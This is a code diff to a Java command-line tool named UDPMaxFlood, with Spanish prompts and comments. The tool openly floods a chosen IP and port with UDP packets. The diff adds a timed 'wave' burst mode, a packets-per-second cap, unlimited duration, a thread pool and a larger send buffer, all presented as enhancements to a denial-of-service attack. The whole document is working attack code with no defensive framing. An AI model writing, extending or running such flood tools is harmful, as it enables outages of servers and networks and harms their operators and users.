@@ -2,41 +2,80 @@ import java.net.*;
 import java.util.Random;
 import java.util.concurrent.atomic.AtomicLong;
 import java.util.Scanner;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 public class UDPMaxFlood {
     private static AtomicLong packetCount = new AtomicLong(0);
     private static volatile boolean running = true;
     private static long startTime = 0;
     private static int packetSize = 0;
+    private static boolean waveMode = false;
+    private static int waveDuration = 5;
+    private static int waveInterval = 2;
+    private static int packetsPerSecond = 0; // 0 = máximo rendimiento
     
     public static void main(String[] args) {
-        // Verificar si se proporcionaron argumentos por línea de comandos
-        if (args.length >= 4) {
+        if (args.length >= 3) {
             // Modo línea de comandos
             try {
                 String targetIP = args[0];
                 int targetPort = Integer.parseInt(args[1]);
                 packetSize = Integer.parseInt(args[2]);
-                int threadCount = Integer.parseInt(args[3]);
-                int duration = (args.length >= 5) ? Integer.parseInt(args[4]) : 0;
+                int threadCount = args.length >= 4 ? Integer.parseInt(args[3]) : Runtime.getRuntime().availableProcessors() * 2;
+                
+                // Parámetros opcionales
+                boolean useWaveMode = false;
+                int customWaveDuration = 5;
+                int customWaveInterval = 2;
+                int customPPS = 0;
+                
+                for (int i = 4; i < args.length; i++) {
+                    if (args[i].equals("-wave")) {
+                        useWaveMode = true;
+                    } else if (args[i].equals("-wavedur") && i + 1 < args.length) {
+                        customWaveDuration = Integer.parseInt(args[++i]);
+                    } else if (args[i].equals("-waveint") && i + 1 < args.length) {
+                        customWaveInterval = Integer.parseInt(args[++i]);
+                    } else if (args[i].equals("-pps") && i + 1 < args.length) {
+                        customPPS = Integer.parseInt(args[++i]);
+                    }
+                }
                 
                 // Validaciones básicas
-                if (packetSize < 1472 || packetSize > 65500) {
-                    System.out.println("Error: Tamaño de paquete inválido (1472-65500 bytes)");
+                if (packetSize < 1 || packetSize > 65500) {
+                    System.out.println("Error: Tamaño de paquete inválido (1-65500 bytes)");
                     return;
                 }
                 
-                System.out.println("[!] Iniciando ataque UDP en modo línea de comandos...");
+                if (customWaveDuration < 1 || customWaveDuration > 10) {
+                    System.out.println("Error: Duración de oleaje inválida (1-10 segundos)");
+                    return;
+                }
+                
+                if (customWaveInterval < 1 || customWaveInterval > 10) {
+                    System.out.println("Error: Intervalo de oleaje inválido (1-10 segundos)");
+                    return;
+                }
+                
+                System.out.println("[!] Iniciando ataque UDP infinito...");
                 System.out.println("   Target: " + targetIP + ":" + targetPort);
                 System.out.println("   Hilos: " + threadCount);
                 System.out.println("   Tamaño de paquete: " + packetSize + " bytes");
-                System.out.println("   Duración: " + (duration > 0 ? duration + " segundos" : "Infinita"));
+                System.out.println("   Paquetes/segundo: " + (customPPS > 0 ? customPPS : "Máximo"));
+                System.out.println("   Modo oleaje: " + (useWaveMode ? "Activado (" + customWaveDuration + "s/" + customWaveInterval + "s)" : "Desactivado"));
+                System.out.println("   Use Ctrl+C para detener el ataque");
                 
-                startAttack(targetIP, targetPort, threadCount, duration);
+                waveMode = useWaveMode;
+                waveDuration = customWaveDuration;
+                waveInterval = customWaveInterval;
+                packetsPerSecond = customPPS;
+                startAttack(targetIP, targetPort, threadCount);
                 
             } catch (Exception e) {
                 System.out.println("Error en parámetros: " + e.getMessage());
-                System.out.println("Uso: java UDPMaxFlood <IP> <puerto> <tamaño> <hilos> [duración]");
+                System.out.println("Uso: java UDPMaxFlood <IP> <puerto> <tamaño> [hilos] [-wave] [-wavedur segundos] [-waveint segundos] [-pps paquetes_por_segundo]");
             }
         } else {
             // Modo interactivo
@@ -68,18 +107,42 @@ public class UDPMaxFlood {
             System.out.print("[?] Ingresa el puerto objetivo (ej: 19132): ");
             int targetPort = Integer.parseInt(scanner.nextLine());
             
-            System.out.print("[?] Tamaño de paquete (1472-65500 bytes): ");
+            System.out.print("[?] Tamaño de paquete (1-65500 bytes): ");
             packetSize = Integer.parseInt(scanner.nextLine());
             
             System.out.print("[?] Número de hilos (recomendado: " + 
                            Runtime.getRuntime().availableProcessors() * 2 + "): ");
             int threadCount = Integer.parseInt(scanner.nextLine());
             
-            System.out.print("[?] Duración en segundos (0 = infinito): ");
-            int duration = Integer.parseInt(scanner.nextLine());
+            System.out.print("[?] Límite de paquetes/segundo (0 = máximo): ");
+            packetsPerSecond = Integer.parseInt(scanner.nextLine());
+            
+            System.out.print("[?] ¿Activar modo oleaje/montaña rusa? (s/n): ");
+            String waveResponse = scanner.nextLine();
+            
+            if (waveResponse.equalsIgnoreCase("s") || waveResponse.equalsIgnoreCase("si")) {
+                waveMode = true;
+                
+                System.out.print("[?] Duración de cada oleada (1-10 segundos): ");
+                waveDuration = Integer.parseInt(scanner.nextLine());
+                
+                System.out.print("[?] Intervalo entre oleadas (1-10 segundos): ");
+                waveInterval = Integer.parseInt(scanner.nextLine());
+                
+                // Validar los valores de oleaje
+                if (waveDuration < 1 || waveDuration > 10) {
+                    System.out.println("Error: Duración de oleaje debe estar entre 1 y 10 segundos");
+                    return;
+                }
+                
+                if (waveInterval < 1 || waveInterval > 10) {
+                    System.out.println("Error: Intervalo de oleaje debe estar entre 1 y 10 segundos");
+                    return;
+                }
+            }
             
             // Validaciones
-            if (packetSize < 1472 || packetSize > 65500) {
+            if (packetSize < 1 || packetSize > 65500) {
                 System.out.println("Error: Tamaño de paquete inválido");
                 return;
             }
@@ -88,7 +151,9 @@ public class UDPMaxFlood {
             System.out.println("   Target: " + targetIP + ":" + targetPort);
             System.out.println("   Hilos: " + threadCount);
             System.out.println("   Tamaño de paquete: " + packetSize + " bytes");
-            System.out.println("   Duración: " + (duration > 0 ? duration + " segundos" : "Infinita"));
+            System.out.println("   Paquetes/segundo: " + (packetsPerSecond > 0 ? packetsPerSecond : "Máximo"));
+            System.out.println("   Modo oleaje: " + (waveMode ? "Activado (" + waveDuration + "s/" + waveInterval + "s)" : "Desactivado"));
+            System.out.println("   Duración: Infinita (Ctrl+C para detener)");
             
             System.out.print("\n[!] ¿Iniciar ataque? (s/n): ");
             String confirm = scanner.nextLine();
@@ -98,7 +163,7 @@ public class UDPMaxFlood {
                 return;
             }
             
-            startAttack(targetIP, targetPort, threadCount, duration);
+            startAttack(targetIP, targetPort, threadCount);
             scanner.close();
             
         } catch (Exception e) {
@@ -106,9 +171,9 @@ public class UDPMaxFlood {
         }
     }
     
-    private static void startAttack(String targetIP, int targetPort, int threadCount, int duration) {
+    private static void startAttack(String targetIP, int targetPort, int threadCount) {
         try {
-            System.out.println("\n[!] Iniciando ataque UDP... Ctrl+C para detener");
+            System.out.println("\n[!] Iniciando ataque UDP infinito... Ctrl+C para detener");
             
             // Iniciar estadísticas
             startTime = System.currentTimeMillis();
@@ -116,24 +181,16 @@ public class UDPMaxFlood {
             statsThread.setDaemon(true);
             statsThread.start();
             
-            // Crear hilos de ataque
-            Thread[] threads = new Thread[threadCount];
+            // Crear pool de hilos
+            ExecutorService executor = Executors.newFixedThreadPool(threadCount);
             for (int i = 0; i < threadCount; i++) {
-                threads[i] = new Thread(new FloodWorker(targetIP, targetPort, i));
-                threads[i].start();
+                executor.execute(new FloodWorker(targetIP, targetPort, i));
             }
             
-            // Control de tiempo
-            if (duration > 0) {
-                Thread.sleep(duration * 1000);
-                running = false;
-                System.out.println("\n[!] Ataque completado por tiempo");
-            } else {
-                // Esperar indefinidamente
-                while (running) {
-                    Thread.sleep(1000);
-                }
-            }
+            executor.shutdown();
+            
+            // Esperar indefinidamente (hasta Ctrl+C)
+            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.SECONDS);
             
         } catch (Exception e) {
             System.out.println("Error: " + e.getMessage());
@@ -144,6 +201,7 @@ public class UDPMaxFlood {
         private final String targetIP;
         private final int targetPort;
         private final int threadId;
+        private final Random random = new Random();
         
         public FloodWorker(String targetIP, int targetPort, int threadId) {
             this.targetIP = targetIP;
@@ -155,22 +213,82 @@ public class UDPMaxFlood {
         public void run() {
             try {
                 DatagramSocket socket = new DatagramSocket();
+                socket.setSendBufferSize(1024 * 1024);
                 InetAddress address = InetAddress.getByName(targetIP);
                 
                 // Crear payload aleatorio
                 byte[] payload = new byte[packetSize];
-                new Random().nextBytes(payload);
+                random.nextBytes(payload);
                 
                 DatagramPacket packet = new DatagramPacket(
                     payload, payload.length, address, targetPort
                 );
                 
-                // Bucle de ataque
+                // Variables para el modo oleaje
+                long lastWaveChange = System.currentTimeMillis();
+                boolean inWave = true;
+                
+                // Variables para control de tasa de paquetes
+                long lastBatchTime = System.currentTimeMillis();
+                int packetsSentInBatch = 0;
+                
+                // Bucle de ataque infinito
                 while (running) {
-                    // Envío por lotes para mejor rendimiento
-                    for (int i = 0; i < 100 && running; i++) {
-                        socket.send(packet);
-                        packetCount.incrementAndGet();
+                    // Modo oleaje: alternar entre envío rápido y pausas
+                    if (waveMode) {
+                        long currentTime = System.currentTimeMillis();
+                        long elapsed = (currentTime - lastWaveChange) / 1000;
+                        
+                        if (inWave && elapsed >= waveDuration) {
+                            // Cambiar a intervalo de pausa
+                            inWave = false;
+                            lastWaveChange = currentTime;
+                            System.out.println("\n[OLEAJE] Pausa por " + waveInterval + " segundos");
+                        } else if (!inWave && elapsed >= waveInterval) {
+                            // Cambiar a oleada activa
+                            inWave = true;
+                            lastWaveChange = currentTime;
+                            packetsSentInBatch = 0;
+                            lastBatchTime = currentTime;
+                            System.out.println("\n[OLEAJE] Oleada activa por " + waveDuration + " segundos");
+                        }
+                        
+                        // Si estamos en pausa, esperar
+                        if (!inWave) {
+                            try { Thread.sleep(100); } catch (InterruptedException ie) {}
+                            continue;
+                        }
+                    }
+                    
+                    try {
+                        // Controlar tasa de paquetes por segundo si está configurado
+                        if (packetsPerSecond > 0) {
+                            long currentTime = System.currentTimeMillis();
+                            long timeSinceLastBatch = currentTime - lastBatchTime;
+                            
+                            if (timeSinceLastBatch >= 1000) {
+                                // Reiniciar contador cada segundo
+                                packetsSentInBatch = 0;
+                                lastBatchTime = currentTime;
+                            }
+                            
+                            if (packetsSentInBatch < packetsPerSecond) {
+                                socket.send(packet);
+                                packetsSentInBatch++;
+                                packetCount.incrementAndGet();
+                            } else {
+                                // Esperar hasta el próximo intervalo de tiempo
+                                try { Thread.sleep(1); } catch (InterruptedException ie) {}
+                                continue;
+                            }
+                        } else {
+                            // Envío a máxima velocidad
+                            socket.send(packet);
+                            packetCount.incrementAndGet();
+                        }
+                    } catch (Exception e) {
+                        System.out.println("Error en hilo " + threadId + ": " + e.getMessage());
+                        try { Thread.sleep(10); } catch (InterruptedException ie) {}
                     }
                 }
                 
@@ -193,8 +311,18 @@ public class UDPMaxFlood {
                     double pps = (double) count / elapsed;
                     double mbps = (count * packetSize * 8) / (elapsed * 1000000.0);
                     
-                    System.out.printf("\r[ESTADÍSTICAS] Paquetes: %,d | PPS: %,.0f | Ancho de banda: %.2f Mbps", 
-                                     count, pps, mbps);
+                    String waveInfo = "";
+                    if (waveMode) {
+                        waveInfo = " | Modo: OLEAJE";
+                    }
+                    
+                    String ppsInfo = "";
+                    if (packetsPerSecond > 0) {
+                        ppsInfo = " | Límite: " + packetsPerSecond + " pps";
+                    }
+                    
+                    System.out.printf("\r[ESTADÍSTICAS] Paquetes: %,d | PPS: %,.0f | Ancho de banda: %.2f Mbps%s%s", 
+                                     count, pps, mbps, ppsInfo, waveInfo);
                 }
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
@@ -208,6 +336,7 @@ public class UDPMaxFlood {
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             running = false;
             System.out.println("\n\n[!] Deteniendo ataque...");
+            System.out.println("[!] Total de paquetes enviados: " + packetCount.get());
         }));
     }
 }
